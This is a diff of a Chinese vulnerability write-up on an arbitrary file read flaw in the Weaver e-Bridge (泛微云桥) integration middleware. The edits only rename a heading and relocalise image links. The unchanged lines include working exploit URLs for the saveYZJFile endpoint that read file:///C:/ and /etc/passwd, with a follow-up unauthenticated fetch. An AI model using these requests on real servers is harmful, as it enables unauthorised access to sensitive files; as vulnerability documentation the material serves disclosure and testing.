@@ -4,7 +4,7 @@
 
 泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
 
-## 影响版本
+## 漏洞影响
 
 ```
 泛微云桥 e-Bridge 2018-2019 多个版本
@@ -24,25 +24,25 @@ title="泛微云桥e-Bridge"
 
 访问 [**http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt**](http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt)
 
-![image-20220209104944042](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091049126.png)
+![image-20220209104944042](./images/202202091049126.png)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![image-20220209104956250](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091049307.png)
+![image-20220209104956250](./images/202202091049307.png)
 
 ### Linux
 
 访问 [**http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt**](http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt)
 
-![image-20220209105016727](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091050824.png)
+![image-20220209105016727](./images/202202091050824.png)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![image-20220209105027907](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091050974.png)
+![image-20220209105027907](./images/202202091050974.png)
 
 ## 漏洞POC
 
@@ -179,4 +179,4 @@ if __name__ == '__main__':
                 POC_4(target_url, File)
 ```
 
-![image-20220209105047595](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091050654.png)
+![image-20220209105047595](./images/202202091050654.png)
